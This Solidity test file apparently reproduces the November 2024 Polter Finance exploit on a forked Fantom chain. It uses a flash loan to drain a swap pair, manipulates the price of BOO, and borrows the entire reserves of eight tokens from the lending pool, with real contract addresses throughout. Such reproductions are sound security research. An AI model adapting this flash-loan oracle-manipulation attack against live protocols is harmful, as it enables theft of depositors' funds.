// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import {IERC20} from "../../interfaces/IERC20.sol";
import {IUniswapV3Pair} from "test/utils/IUniswapV3Pair.sol";
import {IUniswapV2Pair} from "test/utils/IUniswapV2Pair.sol";
import {IUniswapV2Router02} from "test/utils/IUniswapV2Router.sol";

/**
 * @title Polter Finance Exploit PoC (Nov 2024)
 * @notice $7M Polter Finance hack on Fantom network
 *
 */
interface ILendingPool {
    struct ReserveConfigurationMap {
        uint256 data;
    }

    struct ReserveData {
        ReserveConfigurationMap configuration;
        uint128 liquidityIndex;
        uint128 variableBorrowIndex;
        uint128 currentLiquidityRate;
        uint128 currentVariableBorrowRate;
        uint128 currentStableBorrowRate;
        uint40 lastUpdateTimestamp;
        address aTokenAddress;
        address stableDebtTokenAddress;
        address variableDebtTokenAddress;
        address interestRateStrategyAddress;
        uint8 id;
    }

    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 refCode) external;
    function getReserveData(address asset) external returns (ReserveData memory);
    function borrow(
        address asset,
        uint256 amount,
        uint256 interestRateMode,
        uint16 refCode,
        address onBehalfOf
    ) external;
}

contract Exploit_Polter_Finance is TestHarness, TokenBalanceTracker {
    address internal attacker = 0x511f427Cdf0c4e463655856db382E05D79Ac44a6;

    IERC20 private constant WFTM = IERC20(0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83);
    IERC20 private constant BOO = IERC20(0x841FAD6EAe12c286d1Fd18d1d525DFfA75C7EFFE);
    IERC20 private constant MIM = IERC20(0x82f0B8B456c1A451378467398982d4834b6829c1);
    IERC20 private constant WBTC = IERC20(0xf1648C50d2863f780c57849D812b4B7686031A3D);
    IERC20 private constant WETH = IERC20(0x695921034f0387eAc4e11620EE91b1b15A6A09fE);
    IERC20 private constant USDC = IERC20(0x2F733095B80A04b38b0D10cC884524a3d09b836a);
    IERC20 private constant WSOL = IERC20(0xd99021C2A33e4Cf243010539c9e9b7c52E0236c1);

    IERC20 private constant sFTMX = IERC20(0xd7028092c830b5C8FcE061Af2E593413EbbC1fc1);
    IERC20 private constant axlUSDC = IERC20(0x1B6382DBDEa11d97f24495C9A90b7c88469134a4);

    ILendingPool private constant Lending = ILendingPool(0x867fAa51b3A437B4E2e699945590Ef4f2be2a6d5);
    IUniswapV2Router02 private constant Router =
        IUniswapV2Router02(0xF491e7B69E4244ad4002BC14e878a34207E38c29);
    IUniswapV2Pair private constant pairWftmBooV2 =
        IUniswapV2Pair(0xEc7178F4C41f346b2721907F5cF7628E388A7a58);
    IUniswapV3Pair private constant pairWftmBooV3 =
        IUniswapV3Pair(0xEd23Be0cc3912808eC9863141b96A9748bc4bd89);

    function setUp() external {
        cheat.createSelectFork(vm.envString("RPC_URL"), 97_508_838);
        deal(address(this), 0);

        addTokenToTracker(address(WFTM));
        addTokenToTracker(address(BOO));
        addTokenToTracker(address(WSOL));
        addTokenToTracker(address(WBTC));
        addTokenToTracker(address(WETH));
        addTokenToTracker(address(MIM));
        addTokenToTracker(address(USDC));
        addTokenToTracker(address(sFTMX));
        addTokenToTracker(address(axlUSDC));

        updateBalanceTracker(attacker);
    }

    function test_attack() external {
        console.log("------- INITIAL BALANCES -------");
        logBalancesWithLabel("Attacker", attacker);

        console.log("------- STEP 1: Get the flashloan -------");
        pairWftmBooV3.flash(address(this), 0, BOO.balanceOf(address(pairWftmBooV3)), "");
    }

    function uniswapV3FlashCallback(
        uint256,
        /* fee0 */
        uint256 fee1,
        bytes calldata /* data */
    )
        external
    {
        logBalancesWithLabel("Attacker", address(this));

        uint256 repay = BOO.balanceOf(address(this)) + fee1;
        console.log("------- STEP 2: Flash Swap -------");

        pairWftmBooV2.swap(0, BOO.balanceOf(address(pairWftmBooV2)) - 1e3, address(this), "0");
        logBalancesWithLabel("Attacker", address(this));

        WFTM.approve(address(Router), type(uint256).max);
        swapWftmToBoo(5000e18);

        BOO.transfer(address(pairWftmBooV3), repay);
        BOO.transfer(address(this), BOO.balanceOf(address(this)));
        WFTM.transfer(address(this), WFTM.balanceOf(address(this)));

        console.log("------- FINAL BALANCE-------");
        logBalancesWithLabel("Attacker", address(this));
    }

    function uniswapV2Call(
        address, /* sender */
        uint256, /* amount0 */
        uint256 amount1,
        bytes calldata /* data */
    )
        external
    {
        BOO.approve(address(Lending), 1e18);
        Lending.deposit(address(BOO), 1e18, address(this), 0);

        exploitToken(WFTM);
        exploitToken(MIM);
        exploitToken(sFTMX);
        exploitToken(axlUSDC);
        exploitToken(WBTC);
        exploitToken(WETH);
        exploitToken(USDC);
        exploitToken(WSOL);

        BOO.transfer(address(pairWftmBooV2), (amount1 * 1000) / 998 + 1);
    }

    function exploitToken(IERC20 token) public {
        ILendingPool.ReserveData memory reserveData = Lending.getReserveData(address(token));
        Lending.borrow(address(token), token.balanceOf(reserveData.aTokenAddress), 2, 0, address(this));
        token.transfer(address(this), token.balanceOf(address(this)));
    }

    function swapWftmToBoo(uint256 _amountOut) internal {
        address[] memory path = new address[](2);
        path[0] = address(WFTM);
        path[1] = address(BOO);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            _amountOut, 0, path, address(this), block.timestamp + 3600
        );
    }
}
